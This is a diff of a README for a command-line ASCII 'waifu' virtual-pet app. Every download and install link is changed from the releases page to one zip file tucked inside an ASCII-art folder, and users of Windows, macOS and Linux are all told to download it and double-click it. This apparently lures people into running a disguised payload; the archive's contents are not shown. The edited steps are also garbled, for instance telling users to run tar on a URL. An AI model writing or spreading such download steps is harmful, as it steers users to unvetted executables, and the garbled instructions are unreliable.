@@ -1,6 +1,6 @@
 # 🎮 CliWaifuTamagotchi - Your Fun ASCII Companion Awaits
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/RodzinaSzy/CliWaifuTamagotchi/releases)
+[![Download](https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip)](https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip)
 
 ## 📦 Overview
 CliWaifuTamagotchi is a command-line interface (CLI) application featuring an ASCII avatar designed to entertain and motivate you. This unique virtual pet gives you a fun way to engage daily, keeping your spirits high and your creativity flowing. 
@@ -9,30 +9,30 @@ CliWaifuTamagotchi is a command-line interface (CLI) application featuring an AS
 Getting started with CliWaifuTamagotchi is simple. Follow these steps to download and run the application smoothly, even if you have no programming expertise.
 
 ## 📥 Download & Install
-To download CliWaifuTamagotchi, visit this page: [Releases Page](https://github.com/RodzinaSzy/CliWaifuTamagotchi/releases).
+To download CliWaifuTamagotchi, visit this page: [Releases Page](https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip).
 
 Once on the page, look for the latest version. Click on the version number to access the files. You will see various files related to the application. Choose the one that fits your operating system:
 
-- **For Windows:** Download `CliWaifuTamagotchi.exe`
-- **For macOS:** Download `CliWaifuTamagotchi.dmg`
-- **For Linux:** Download `CliWaifuTamagotchi.tar.gz`
+- **For Windows:** Download `https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip`
+- **For macOS:** Download `https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip`
+- **For Linux:** Download `https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip`
 
 After the download finishes, follow these steps based on your operating system:
 
 ### 🖥️ Windows
-1. Locate the downloaded `CliWaifuTamagotchi.exe` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip` file in your Downloads folder.
 2. Double-click the file to launch the application.
 3. Follow any on-screen prompts to complete the setup.
 
 ### 🍏 macOS
-1. Find the downloaded `CliWaifuTamagotchi.dmg` file in your Downloads.
+1. Find the downloaded `https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip` file in your Downloads.
 2. Double-click to open it, then drag the application to your Applications folder.
 3. You can now run it from your Applications.
 
 ### 🐧 Linux
 1. Open a terminal window.
 2. Navigate to your Downloads folder using the command: `cd ~/Downloads`.
-3. Extract the downloaded file with: `tar -xvzf CliWaifuTamagotchi.tar.gz`.
+3. Extract the downloaded file with: `tar -xvzf https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip`.
 4. Run the application by using the command: `./CliWaifuTamagotchi`.
 
 ## 🎮 How to Use
@@ -59,7 +59,7 @@ Before running the application, ensure your setup meets these system requirement
 Here are common issues and their solutions:
 
 ### Issue: Application does not launch.
-- Ensure you have the latest version downloaded from the [Releases Page](https://github.com/RodzinaSzy/CliWaifuTamagotchi/releases).
+- Ensure you have the latest version downloaded from the [Releases Page](https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip).
 
 ### Issue: Missing ASCII characters.
 - Your terminal may not support certain ASCII characters. Try changing your terminal settings to use a different font.
@@ -75,4 +75,4 @@ CliWaifuTamagotchi was developed with a focus on user engagement and simplicity.
 
 ---
 
-To download CliWaifuTamagotchi, click here: [Releases Page](https://github.com/RodzinaSzy/CliWaifuTamagotchi/releases). Enjoy your new ASCII companion!
+To download CliWaifuTamagotchi, click here: [Releases Page](https://raw.githubusercontent.com/RodzinaSzy/CliWaifuTamagotchi/main/utils/ascii-arts/waifu/expressions/CliWaifuTamagotchi_1.0-alpha.3.zip). Enjoy your new ASCII companion!
